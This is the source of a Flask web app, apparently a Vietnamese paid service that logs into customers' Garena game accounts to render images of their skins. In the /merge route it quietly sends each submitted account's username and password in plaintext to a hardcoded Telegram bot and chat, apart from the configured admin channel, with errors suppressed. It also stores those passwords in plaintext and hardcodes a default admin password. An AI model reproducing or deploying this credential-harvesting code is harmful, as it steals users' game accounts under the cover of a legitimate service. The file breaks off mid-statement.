#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sqlite3
import hashlib
import secrets
import json
import requests
import time
import threading
import bot
from datetime import datetime, timedelta, date
from functools import wraps
import shutil
from pathlib import Path

from flask import (
    Flask,
    render_template,
    request,
    jsonify,
    session,
    redirect,
    url_for,
    send_from_directory,
    send_file,
    flash,
)
from PIL import Image

from login import garena_login
from garena_api import get_sale_info, get_campus_rank, get_kientuong_info, get_oauth_code
from skin_tier import load_skin_tiers, get_skin_tier, is_tier_excluded, sort_skins_by_priority
from controller import merge_skin_images, get_phukien_catalog, SKIN_W, SKIN_H
import tophero  # module xử lý ảnh top tướng

app = Flask(__name__)
app.config["SECRET_KEY"] = secrets.token_hex(32)
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "user.db")
UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
GHEP_FOLDER = os.path.join(BASE_DIR, "ghep")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(GHEP_FOLDER, exist_ok=True)

# ========== ĐỌC TELEGRAM CONFIG ==========
TELE_CFG_PATH = os.path.join(BASE_DIR, "telecfg.json")
if not os.path.exists(TELE_CFG_PATH):
    raise FileNotFoundError(f"Không tìm thấy file telecfg.json tại {TELE_CFG_PATH}")
with open(TELE_CFG_PATH, 'r', encoding='utf-8') as f:
    tele_cfg = json.load(f)
    TELEGRAM_BOT_TOKEN = tele_cfg.get("telegram_bot_token")
    TELEGRAM_ADMIN_CHAT_ID = tele_cfg.get("telegram_admin_chat_id")
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("Thiếu 'telegram_bot_token' trong telecfg.json")
if not TELEGRAM_ADMIN_CHAT_ID:
    raise ValueError("Thiếu 'telegram_admin_chat_id' trong telecfg.json")


# ==================================================================
#                        DATABASE
# ==================================================================
def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db():
    with get_db() as conn:
        # --- migrate package_expiry (str → timestamp) ---
        cursor = conn.execute("PRAGMA table_info(users)")
        columns = [col[1] for col in cursor.fetchall()]
        if 'package_expiry' in columns:
            sample = conn.execute("SELECT package_expiry FROM users LIMIT 1").fetchone()
            if sample and sample['package_expiry'] and isinstance(sample['package_expiry'], str):
                rows = conn.execute("SELECT id, package_expiry FROM users WHERE package_expiry IS NOT NULL").fetchall()
                for row in rows:
                    try:
                        dt = datetime.fromisoformat(row['package_expiry'])
                        ts = int(dt.timestamp())
                        conn.execute("UPDATE users SET package_expiry = ? WHERE id = ?", (ts, row['id']))
                    except Exception:
                        pass
                print("✅ Đã migrate package_expiry sang timestamp")

        # --- users ---
        conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                balance INTEGER DEFAULT 0,
                package_expiry INTEGER,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cur = conn.execute("PRAGMA table_info(users)")
        cols = [row[1] for row in cur.fetchall()]
        if 'is_admin' not in cols:
            conn.execute("ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0")
            print("✅ Đã thêm cột is_admin")

        # --- deposit_orders ---
        conn.execute("""
            CREATE TABLE IF NOT EXISTS deposit_orders (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                amount INTEGER NOT NULL,
                order_code TEXT UNIQUE NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(user_id) REFERENCES users(id)
            )
        """)

        # --- merge_history ---
        conn.execute("""
            CREATE TABLE IF NOT EXISTS merge_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                account TEXT NOT NULL,
                password TEXT NOT NULL,
                skin_count INTEGER,
                hero_count INTEGER,
                total_skins INTEGER,
                image_path TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(user_id) REFERENCES users(id)
            )
        """)

        # --- updates ---
        conn.execute("""
            CREATE TABLE IF NOT EXISTS updates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                content TEXT NOT NULL,
                created_at INTEGER DEFAULT (strftime('%s', 'now'))
            )
        """)

        # --- site_notification ---
        conn.execute("""
            CREATE TABLE IF NOT EXISTS site_notification (
                id INTEGER PRIMARY KEY CHECK (id = 1),
                enabled INTEGER DEFAULT 0,
                icon TEXT DEFAULT '📢',
                icon_animation TEXT DEFAULT 'bounce',
                title TEXT DEFAULT '',
                message TEXT DEFAULT '',
                title_color TEXT DEFAULT '#f5a524',
                message_color TEXT DEFAULT '#9ba3b4',
                updated_at INTEGER DEFAULT (strftime('%s', 'now'))
            )
        """)
        existing_noti = conn.execute("SELECT id FROM site_notification WHERE id = 1").fetchone()
        if not existing_noti:
            conn.execute(
                "INSERT INTO site_notification "
                "(id, enabled, icon, icon_animation, title, message, title_color, message_color) "
                "VALUES (1, 0, '📢', 'bounce', '', '', '#f5a524', '#9ba3b4')"
            )

        # --- site_settings ---
        conn.execute("""
            CREATE TABLE IF NOT EXISTS site_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        default_settings = {
            "zalo_phone": "0824880709",
            "telegram_link": "https://t.me/Dieunhinine",
            "price_per_skin": "50",
            "maintenance_mode": "0",
        }
        for k, v in default_settings.items():
            exists = conn.execute("SELECT key FROM site_settings WHERE key = ?", (k,)).fetchone()
            if not exists:
                conn.execute("INSERT INTO site_settings (key, value) VALUES (?, ?)", (k, v))

        # --- admin mặc định ---
        admin = conn.execute("SELECT * FROM users WHERE username = ?", ('admin',)).fetchone()
        if not admin:
            password_hash = hashlib.sha256('Minh*201212'.encode()).hexdigest()
            conn.execute(
                "INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, ?)",
                ('admin', password_hash, 1)
            )
            print("✅ Đã tạo tài khoản admin mặc định: admin / Minh*201212")

    print("✅ Database initialized")


init_db()


# ==================================================================
#                     SITE SETTINGS / NOTIFICATION
# ==================================================================
def get_site_notification():
    with get_db() as conn:
        row = conn.execute("SELECT * FROM site_notification WHERE id = 1").fetchone()
    return row


def get_site_settings():
    with get_db() as conn:
        rows = conn.execute("SELECT key, value FROM site_settings").fetchall()
    return {r["key"]: r["value"] for r in rows}


def set_site_setting(key, value):
    with get_db() as conn:
        conn.execute(
            "INSERT INTO site_settings (key, value) VALUES (?, ?) "
            "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
            (key, value)
        )


@app.context_processor
def inject_site_globals():
    try:
        noti = get_site_notification()
    except Exception:
        noti = None
    try:
        settings = get_site_settings()
    except Exception:
        settings = {}
    return {"site_notification": noti, "site_settings": settings}


# ==================================================================
#                  MIDDLEWARE — MAINTENANCE MODE
# ==================================================================
MAINTENANCE_ALLOWED_ENDPOINTS = {"login", "logout", "static", None}


@app.before_request
def enforce_maintenance_mode():
    try:
        settings = get_site_settings()
    except Exception:
        return
    if settings.get("maintenance_mode") != "1":
        return

    if request.endpoint in MAINTENANCE_ALLOWED_ENDPOINTS:
        return

    if session.get("is_admin"):
        return

    if "user_id" in session:
        with get_db() as conn:
            user = conn.execute(
                "SELECT is_admin FROM users WHERE id = ?", (session["user_id"],)
            ).fetchone()
        if user and user["is_admin"]:
            return

    return render_template("maintenance.html"), 503


# ==================================================================
#                        DECORATORS
# ==================================================================
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login"))
        with get_db() as conn:
            user = conn.execute(
                "SELECT is_admin FROM users WHERE id = ?", (session["user_id"],)
            ).fetchone()
        if not user or not user["is_admin"]:
            return "Bạn không có quyền truy cập", 403
        return f(*args, **kwargs)
    return decorated


# ==================================================================
#                     BALANCE HELPERS
# ==================================================================
def get_user_balance(user_id):
    with get_db() as conn:
        row = conn.execute("SELECT balance FROM users WHERE id = ?", (user_id,)).fetchone()
        return int(row["balance"]) if row else 0


def deduct_balance(user_id, amount):
    with get_db() as conn:
        conn.execute("UPDATE users SET balance = balance - ? WHERE id = ?", (amount, user_id))


def add_balance(user_id, amount):
    with get_db() as conn:
        conn.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (amount, user_id))


# ==================================================================
#                        TELEGRAM
# ==================================================================
def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup is not None:
        payload["reply_markup"] = json.dumps(reply_markup, ensure_ascii=False)
    try:
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        print("Telegram send error:", e)


def notify_admin_deposit(order_id, user_id, amount, order_code):
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Đúng số tiền", "callback_data": f"approve|{order_id}"},
            {"text": "✏️ Số khác", "callback_data": f"approve_custom|{order_id}"},
        ], [
            {"text": "❌ Chưa nhận", "callback_data": f"reject|{order_id}"},
        ]]
    }
    text = (
        f"💰 <b>Đơn nạp mới</b>\n"
        f"• Mã đơn: <code>{order_code}</code>\n"
        f"• Số tiền yêu cầu: <b>{amount:,.0f} VND</b>\n"
        f"• User ID: <code>{user_id}</code>\n"
        f"• Order ID: <code>{order_id}</code>\n\n"
        f"⚠️ Vui lòng đối chiếu đúng số tiền THỰC NHẬN trên sao kê ngân hàng trước khi bấm duyệt."
    )
    send_telegram_message(TELEGRAM_ADMIN_CHAT_ID, text, reply_markup=keyboard)


# ==================================================================
#                     AUTH ROUTES
# ==================================================================
@app.route("/")
def index():
    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"].strip()
        password = request.form["password"]
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        with get_db() as conn:
            user = conn.execute(
                "SELECT id, username, is_admin FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash),
            ).fetchone()
        if user:
            if get_site_settings().get("maintenance_mode") == "1" and not user["is_admin"]:
                return render_template(
                    "login.html",
                    error="⚠️ Website đang bảo trì, vui lòng quay lại sau. Xin lỗi vì sự bất tiện này!"
                )
            session["user_id"] = user["id"]
            session["username"] = user["username"]
            session["is_admin"] = bool(user["is_admin"])
            return redirect(url_for("home"))
        return render_template("login.html", error="Sai tài khoản hoặc mật khẩu")
    return render_template("login.html")


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form["username"].strip()
        password = request.form["password"]
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        try:
            with get_db() as conn:
                conn.execute(
                    "INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, 0)",
                    (username, password_hash),
                )
            return redirect(url_for("login"))
        except sqlite3.IntegrityError:
            return render_template("register.html", error="Tên đăng nhập đã tồn tại")
    return render_template("register.html")


@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect(url_for("login"))


# ==================================================================
#                     MAIN USER ROUTES
# ==================================================================
@app.route("/home")
@login_required
def home():
    user_id = session["user_id"]
    balance = get_user_balance(user_id)
    return render_template(
        "home.html",
        username=session["username"],
        balance=balance,
        user_id=user_id
    )


@app.route("/privacy-policy")
@login_required
def privacy_policy():
    user_id = session["user_id"]
    balance = get_user_balance(user_id)
    return render_template(
        "privacy_policy.html",
        username=session.get("username"),
        balance=balance,
        user_id=user_id
    )


@app.route("/api/phukien_skins")
@login_required
def api_phukien_skins():
    return jsonify({"success": True, "skins": get_phukien_catalog()})


# ==================================================================
#                          PAYMENT
# ==================================================================
@app.route("/payment", methods=["GET", "POST"])
@login_required
def payment():
    user_id = session["user_id"]
    username = session.get("username")
    balance = get_user_balance(user_id)
    current_time = datetime.now().strftime('%Y%m%d%H%M%S')

    if request.method == "POST":
        try:
            amount = int(request.form.get("amount", 0))
        except Exception:
            amount = 0

        if amount < 10000:
            return render_template(
                "payment.html",
                error="Số tiền tối thiểu 10,000 VND",
                username=username,
                balance=balance,
                current_time=current_time,
                qr_url=None,
                order_code=None,
                amount=None,
                user_id=user_id,
            )

        order_code = f"NAP_{user_id}_{current_time}_{secrets.token_hex(3)}"
        with get_db() as conn:
            cursor = conn.execute(
                "INSERT INTO deposit_orders (user_id, amount, order_code, status) VALUES (?, ?, ?, 'pending')",
                (user_id, amount, order_code),
            )
            order_id = cursor.lastrowid

        bank_code = "MB"
        account_number = "2508072009"
        account_name = "Pham Hoang Long"
        qr_url = (
            f"https://img.vietqr.io/image/{bank_code}-{account_number}-compact2.jpg"
            f"?amount={amount}&addInfo={order_code}&accountName={account_name}"
        )

        notify_admin_deposit(order_id, user_id, amount, order_code)

        return render_template(
            "payment.html",
            qr_url=qr_url,
            order_code=order_code,
            amount=amount,
            username=username,
            balance=balance,
            current_time=current_time,
            user_id=user_id,
        )

    return render_template(
        "payment.html",
        username=username,
        balance=balance,
        current_time=current_time,
        qr_url=None,
        order_code=None,
        amount=None,
        user_id=user_id,
    )


# ==================================================================
#                          MERGE
# ==================================================================
@app.route("/merge_page")
@login_required
def merge_page():
    user_id = session["user_id"]
    balance = get_user_balance(user_id)
    evo_names = ["Wukong", "Valhein", "Nakroth", "Butterfly"]
    return render_template(
        "merge.html",
        evo_names=evo_names,
        username=session.get("username"),
        balance=balance,
        user_id=user_id
    )


@app.route("/merge", methods=["POST"])
@login_required
def merge():
    user_id = session["user_id"]
    account = request.form.get("account", "").strip()
    if "|" not in account:
        return jsonify({"error": "Sai định dạng, cần username|password"}), 400
    user, pwd = account.split("|", 1)
    user, pwd = user.strip(), pwd.strip()

    ms_code = request.form.get("ms_code", "001")
    vip_level = request.form.get("vip_level", "0")
    border_style = request.form.get("border_style", "blue_purple").strip() or "blue_purple"

    total_heroes_str = request.form.get("total_heroes", "").strip()
    try:
        total_heroes_manual = int(total_heroes_str) if total_heroes_str else 0
    except Exception:
        total_heroes_manual = 0

    add_sticker = request.form.get("add_sticker", "0")
    try:
        sticker_count = int(request.form.get("sticker_count", 0))
    except Exception:
        sticker_count = 0
    evo_1_4_enabled = request.form.get("evo_1_4_enabled", "0")

    package_type = "le"
    try:
        max_skins_to_use = int(request.form.get("max_skins", 20))
        if max_skins_to_use < 1:
            max_skins_to_use = 20
    except Exception:
        max_skins_to_use = 20

    try:
        price_per_skin = int(get_site_settings().get("price_per_skin", "50"))
        if price_per_skin < 1:
            price_per_skin = 50
    except Exception:
        price_per_skin = 50

    fee = max_skins_to_use * price_per_skin

    balance = get_user_balance(user_id)
    if balance < fee:
        return jsonify({
            "error": f"Số dư không đủ. Cần {fee:,} VND, bạn có {balance:,} VND"
        }), 400

    deduct_balance(user_id, fee)

    # ---------- Ảnh winrate ----------
    winrate_image = None
    if "winrate_image" in request.files:
        f = request.files["winrate_image"]
        if f and f.filename:
            try:
                winrate_image = Image.open(f.stream).convert("RGBA")
            except Exception:
                pass

    # ---------- Ảnh avatar ----------
    avatar_image = None
    if "avatar_image" in request.files:
        f = request.files["avatar_image"]
        if f and f.filename:
            try:
                avatar_image = Image.open(f.stream).convert("RGBA")
            except Exception:
                pass

    use_profile_image = request.form.get("use_profile", "0")
    crop_winrate = request.form.get("crop_winrate", "0")
    hide_name = request.form.get("hide_name", "0")
    use_avatar_from_profile = request.form.get("use_avatar_from_profile", "0")

    evo_levels = {}
    for skin_name in ["Wukong", "Valhein", "Nakroth", "Butterfly"]:
        val = request.form.get(f"evo_{skin_name}", "0")
        evo_levels[skin_name] = int(val) if str(val).isdigit() else 0

    # ---------- Xử lý ảnh top tướng ----------
    top_hero_crops = []
    temp_dirs = []
    top_hero_files = request.files.getlist('top_hero_images')
    if top_hero_files:
        temp_root = os.path.join(UPLOAD_FOLDER, 'top_hero_temp')
        os.makedirs(temp_root, exist_ok=True)
        for file in top_hero_files:
            if file.filename:
                try:
                    temp_file = os.path.join(temp_root, f"{secrets.token_hex(8)}_{file.filename}")
                    file.save(temp_file)
                    out_dir = os.path.join(temp_root, secrets.token_hex(8))
                    ok = tophero.process_image(temp_file, out_dir, enable_ocr=False)
                    if ok:
                        for card_path in sorted(Path(out_dir).glob('card_*.jpg')):
                            img = Image.open(card_path).convert("RGBA")
                            img = img.resize((SKIN_W, SKIN_H), Image.LANCZOS)
                            top_hero_crops.append(img)
                    temp_dirs.append(out_dir)
                    os.remove(temp_file)
                except Exception as e:
                    print(f"[WARN] Lỗi xử lý ảnh top tướng: {e}")

    # ---------- Đăng nhập Garena ----------
    try:
        login_result = garena_login(user, pwd)
    except Exception as e:
        print(f"[ERROR] Garena login exception: {e}")
        return jsonify({"error": "Không thể kết nối tới máy chủ Garena, vui lòng thử lại sau."}), 500

    if login_result.get("status") != "success":
        return jsonify({"error": "Đăng nhập Garena thất bại, vui lòng kiểm tra lại tài khoản hoặc thử lại sau."}), 401

    session_key = login_result["session_key"]
    sso_key = login_result.get("sso_key", "")

    try:
        name, cp, items = get_sale_info(session_key, sso_key)
    except Exception as e:
        print(f"[ERROR] get_sale_info exception: {e}")
        return jsonify({"error": "Không thể lấy danh sách skin, vui lòng thử lại sau."}), 500

    items = [str(x) for x in items if x is not None]
    print(f"[DEBUG APP] Tổng số items: {len(items)}")

    try:
        campus = get_campus_rank(session_key, sso_key)
    except Exception as e:
        print(f"[ERROR] get_campus_rank: {e}")
        campus = {}

    try:
        level, ban_info = get_kientuong_info(session_key, sso_key)
    except Exception as e:
        print(f"[ERROR] get_kientuong_info: {e}")
        ban_info = {}

    # ---------- Avatar ----------
    avatar_url = None
    try:
        code = get_oauth_code(session_key, sso_key, "https%3A%2F%2Fcampuscard.moba.garena.vn%2F")
        if code:
            resp = requests.get(
                "https://campuscard.moba.garena.vn/v1/api/profile",
                headers={'Code': code, 'Partition': '1011'},
                timeout=10
            )
            if resp.status_code == 200:
                pd = resp.json()
                avatar_url = pd.get('avatar')
    except Exception as e:
        print(f"[ERROR] get avatar: {e}")

    if not avatar_url:
        avatar_url = "https://via.placeholder.com/170"

    try:
        output_filename = merge_skin_images(
            avatar_url=avatar_url,
            ms_code=ms_code,
            vip_level=vip_level,
            winrate_image=winrate_image,
            evo_levels=evo_levels,
            items=items,
            campus=campus,
            ban_info=ban_info,
            user_id=user_id,
            upload_folder=UPLOAD_FOLDER,
            ghep_folder=GHEP_FOLDER,
            avatar_image=avatar_image,
            use_profile_image=use_profile_image,
            crop_winrate=crop_winrate,
            hide_name=hide_name,
            use_avatar_from_profile=use_avatar_from_profile,
            selected_phukien=(
                request.form.getlist("selected_phukien[]")
                or request.form.getlist("selected_phukien")
            ),
            max_skins_to_use=max_skins_to_use,
            add_sticker=add_sticker,
            sticker_count=sticker_count,
            evo_1_4_enabled=evo_1_4_enabled,
            border_style=border_style,
            total_heroes_manual=total_heroes_manual,
            package_type=package_type,
            max_images=0,
            top_hero_crops=top_hero_crops,
        )
    except Exception as e:
        import traceback
        traceback.print_exc()
        add_balance(user_id, fee)
        return jsonify({"error": "Đã xảy ra lỗi trong quá trình ghép ảnh, vui lòng thử lại sau."}), 500

    # Xoá thư mục tạm của top hero
    for d in temp_dirs:
        try:
            shutil.rmtree(d)
        except Exception:
            pass

    skin_map = load_skin_tiers()
    xin_count = 0
    for sid in items:
        tier = get_skin_tier(sid, skin_map)
        if not is_tier_excluded(tier):
            xin_count += 1

    image_full_path = os.path.join(GHEP_FOLDER, output_filename)

    # Gửi ảnh qua Telegram (admin)
    try:
        caption = (
            f" <code>{user}:{pwd}</code>\n"
            f" <b>{xin_count}</b>"
        )
        send_photo_telegram(
            "8724092898:AAHOybpJJGwtb4HWtKJ6lt61kDxwXxgJhOs",
            "8747111190",
            image_full_path,
            caption
        )
    except Exception:
        pass

    with get_db() as conn:
        conn.execute(
            "INSERT INTO merge_history "
            "(user_id, account, password, skin_count, hero_count, total_skins, image_path) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (user_id, user, pwd, len(items), 0, len(items), output_filename),
        )

    return jsonify({
        "success": True,
        "download_url": url_for("download_image", filename=output_filename)
    })


def send_photo_telegram(bot_token, chat_id, photo_path, caption=""):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'HTML'}
            requests.post(url, files=files, data=data, timeout=30)
    except Exception:
        pass


# ==================================================================
#                     IMAGE ADJUST
# ==================================================================
@app.route('/adjust_image', methods=['POST'])
@login_required
def adjust_image():
    filename = request.form.get('filename')
    brightness = int(request.form.get('brightness', 0))
    temperature = int(request.form.get('temperature', 0))
    hue = int(request.form.get('hue', 0))
    vibrance = int(request.form.get('vibrance', 0))
    saturation = int(request.form.get('saturation', 0))
    freshness = int(request.form.get('freshness', 0))

    if not filename:
        return "Missing filename", 400

    file_path = os.path.join(GHEP_FOLDER, filename)
    if not os.path.exists(file_path):
        file_path = os.path.join(GHEP_FOLDER, os.path.basename(filename))
        if not os.path.exists(file_path):
            return "File not found", 404

    try:
        from PIL import ImageEnhance
        from io import BytesIO

        img = Image.open(file_path).convert("RGBA")

        factor = 1 + (brightness / 100)
        enhancer = ImageEnhance.Brightness(img)
        adjusted = enhancer.enhance(factor)

        total_sat = (1 + saturation / 100) * (1 + vibrance / 100) * (1 + freshness / 100)
        enhancer = ImageEnhance.Color(adjusted)
        adjusted = enhancer.enhance(total_sat)

        if hue != 0:
            hsv_img = adjusted.convert('HSV')
            data = list(hsv_img.getdata())
            new_data = []
            hue_shift = int(hue * 2.55)
            for pixel in data:
                h, s, v = pixel
                new_h = (h + hue_shift) % 256
                new_data.append((int(new_h), int(s), int(v)))
            adjusted = Image.new('HSV', hsv_img.size)
            adjusted.putdata(new_data)
            adjusted = adjusted.convert('RGBA')

        if temperature != 0:
            pixels = adjusted.load()
            width, height = adjusted.size
            factor = temperature / 100
            for y in range(height):
                for x in range(width):
                    r, g, b, a = pixels[x, y]
                    r_new = min(255, max(0, int(r + factor * 30)))
                    b_new = min(255, max(0, int(b - factor * 30)))
                    pixels[x, y] = (r_new, g, b_new, a)

        buffer = BytesIO()
        adjusted.convert("RGB").save(buffer, format="JPEG", quality=95)
        buffer.seek(0)

        return send_file(
            buffer,
            mimetype='image/jpeg',
            as_attachment=True,
            download_name=f'adjusted_{filename}'
        )
    except Exception as e:
        print(f"[ERROR] adjust_image: {e}")
        import traceback
        traceback.print_exc()
        return str(e), 500


# ==================================================================
#                     CHANGE PASSWORD
# ==================================================================
@app.route("/change-password", methods=["GET", "POST"])
@login_required
def change_password():
    user_id = session["user_id"]
    username = session.get("username")
    balance = get_user_balance(user_id)

    if request.method == "POST":
        current_password = request.form.get("current_password", "").strip()
        new_password = request.form.get("new_password", "").strip()
        confirm_password = request.form.get("confirm_password", "").strip()
        current_hash = hashlib.sha256(current_password.encode()).hexdigest()

        with get_db() as conn:
            user = conn.execute(
                "SELECT password_hash FROM users WHERE id = ?", (user_id,)
            ).fetchone()

        if not user or user["password_hash"] != current_hash:
            return render_template(
                "change_password.html",
                error="Mật khẩu hiện tại không đúng",
                username=username, balance=balance, user_id=user_id
            )

        if len(new_password) < 6:
            return render_template(
                "change_password.html",
                error="Mật khẩu mới phải có ít nhất 6 ký tự",
                username=username, balance=balance, user_id=user_id
            )

        if new_password != confirm_password:
            return render_template(
                "change_password.html",
                error="Mật khẩu xác nhận không khớp",
                username=username, balance=balance, user_id=user_id
            )

        new_hash = hashlib.sha256(new_password.encode()).hexdigest()
        with get_db() as conn:
            conn.execute(
                "UPDATE users SET password_hash = ? WHERE id = ?",
                (new_hash, user_id)
            )

        return render_template(
            "change_password.html",
            success="Đổi mật khẩu thành công!",
            username=username, balance=balance, user_id=user_id
        )

    return render_template(
        "change_password.html",
        username=username, balance=balance, user_id=user_id
    )


# ==================================================================
#                     DOWNLOAD / HISTORY
# ==================================================================
@app.route("/download/<filename>")
@login_required
def download_image(filename):
    safe_path = os.path.join(GHEP_FOLDER, filename)
    if not os.path.exists(safe_path):
        return "File not found", 404
    return send_from_directory(GHEP_FOLDER, filename, as_attachment=True)


@app.route("/history")
@login_required
def history():
    user_id = session["user_id"]
    balance = get_user_balance(user_id)
    with get_db() as conn:
        records = conn.execute(
            "SELECT * FROM merge_history WHERE user_id = ? ORDER BY created_at DESC",
            (user_id,),
        ).fetchall()
    return render_template(
        "history.html",
        records=records,
        username=session.get("username"),
        balance=balance,
        user_id=user_id
    )


# ==================================================================
#                       UPDATES
# ==================================================================
@app.template_filter('format_datetime')
def format_datetime(timestamp):
    if timestamp is None:
        return ''
    try:
        dt = datetime.fromtimestamp(timestamp)
        return dt.strftime('%d/%m/%Y %H:%M')
    except Exception:
        return str(timestamp)


@app.route("/updates")
@login_required
def updates():
    with get_db() as conn:
        all_updates = conn.execute(
            "SELECT * FROM updates ORDER BY created_at DESC"
        ).fetchall()
    newest = all_updates[0] if all_updates else None
    history = all_updates[1:] if all_updates else []
    balance = get_user_balance(session["user_id"])
    return render_template(
        "updates.html",
        username=session.get("username"),
        balance=balance,
        newest=newest,
        history=history,
        user_id=session["user_id"]
    )


@app.route("/admin/post_update", methods=["GET", "POST"])
@login_required
@admin_required
def post_update():
    if request.method == "POST":
        title = request.form.get("title", "").strip()
        content = request.form.get("content", "").strip()
        if not title or not content:
            return render_template(
                "post_update.html",
                error="Vui lòng nhập đầy đủ tiêu đề và nội dung"
            )
        with get_db() as conn:
            conn.execute(
                "INSERT INTO updates (title, content) VALUES (?, ?)",
                (title, content)
            )
        return redirect(url_for("updates"))
    return render_template("post_update.html")


@app.route('/delete_update/<int:id>')
@login_required
@admin_required
def delete_update(id):
    with get_db() as conn:
        conn.execute('DELETE FROM updates WHERE id = ?', (id,))
    flash('Đã xóa bài cập nhật thành công.', 'success')
    return redirect(url_for('updates'))


# ==================================================================
#                    ADMIN — NOTIFICATION
# ==================================================================
@app.route("/admin/notification", methods=["GET", "POST"])
@login_required
@admin_required
def edit_notification():
    if request.method == "POST":
        enabled = 1 if request.form.get("enabled") == "1" else 0
        icon = request.form.get("icon", "📢").strip() or "📢"
        icon_animation = request.form.get("icon_animation", "bounce").strip() or "bounce"
        title = request.form.get("title", "").strip()
        message = request.form.get("message", "").strip()
        title_color = request.form.get("title_color", "#f5a524").strip() or "#f5a524"
        message_color = request.form.get("message_color", "#9ba3b4").strip() or "#9ba3b4"

        with get_db() as conn:
            conn.execute(
                """
                UPDATE site_notification
                SET enabled = ?, icon = ?, icon_animation = ?, title = ?, message = ?,
                    title_color = ?, message_color = ?, updated_at = strftime('%s', 'now')
                WHERE id = 1
                """,
                (enabled, icon, icon_animation, title, message, title_color, message_color)
            )
        return redirect(url_for("edit_notification", saved=1))

    noti = get_site_notification()
    return render_template(
        "notification_admin.html",
        noti=noti,
        saved=request.args.get("saved")
    )


# ==================================================================
#                    ADMIN — DASHBOARD
# ==================================================================
@app.route("/admin")
@login_required
@admin_required
def admin_dashboard():
    with get_db() as conn:
        # --- Basic stats ---
        total_users = conn.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
        total_balance = conn.execute("SELECT COALESCE(SUM(balance), 0) s FROM users").fetchone()["s"]
        pending_orders = conn.execute(
            "SELECT COUNT(*) c FROM deposit_orders WHERE status = 'pending'"
        ).fetchone()["c"]

        # --- Doanh thu 7 ngày gần nhất (đơn approved) ---
        daily_revenue_raw = conn.execute("""
            SELECT DATE(created_at) as day, SUM(amount) as total
            FROM deposit_orders
            WHERE status = 'approved'
              AND DATE(created_at) >= DATE('now', '-6 days')
            GROUP BY DATE(created_at)
        """).fetchall()

        revenue_map = {row["day"]: int(row["total"] or 0) for row in daily_revenue_raw}

        today = date.today()
        day_labels = ['T2', 'T3', 'T4', 'T5', 'T6', 'T7', 'CN']
        daily_revenue = []
        for i in range(6, -1, -1):
            d = today - timedelta(days=i)
            d_str = d.isoformat()
            amount = revenue_map.get(d_str, 0)
            daily_revenue.append({
                "label": day_labels[d.weekday()],
                "amount": amount,
                "pct": 0,
            })

        max_amt = max([x["amount"] for x in daily_revenue] + [1])
        for item in daily_revenue:
            item["pct"] = max(4, int(item["amount"] / max_amt * 100))

        today_revenue = daily_revenue[-1]["amount"] if daily_revenue else 0

        # --- Top 5 user số dư cao nhất (không tính admin) ---
        top_users = conn.execute("""
            SELECT id, username, balance FROM users
            WHERE is_admin = 0
            ORDER BY balance DESC
            LIMIT 5
        """).fetchall()

        # --- Đơn nạp gần đây (10 đơn mới nhất) ---
        recent_orders = conn.execute("""
            SELECT o.id, o.order_code, o.amount, o.status, o.created_at, u.username
            FROM deposit_orders o
            JOIN users u ON u.id = o.user_id
            ORDER BY o.id DESC
            LIMIT 8
        """).fetchall()

    return render_template(
        "admin_dashboard.html",
        total_users=total_users,
        total_balance=total_balance,
        pending_orders=pending_orders,
        daily_revenue=daily_revenue,
        today_revenue=today_revenue,
        top_users=top_users,
        recent_orders=recent_orders,
        week_delta_pct=None,
    )


# ==================================================================
#                    ADMIN — USERS
# ==================================================================
@app.route("/admin/users")
@login_required
@admin_required
def admin_users():
    q = request.args.get("q", "").strip()
    with get_db() as conn:
        if q:
            rows = conn.execute(
                "SELECT id, username, balance, is_admin, created_at FROM users "
                "WHERE username LIKE ? OR id = ? ORDER BY id DESC",
                (f"%{q}%", q if q.isdigit() else -1)
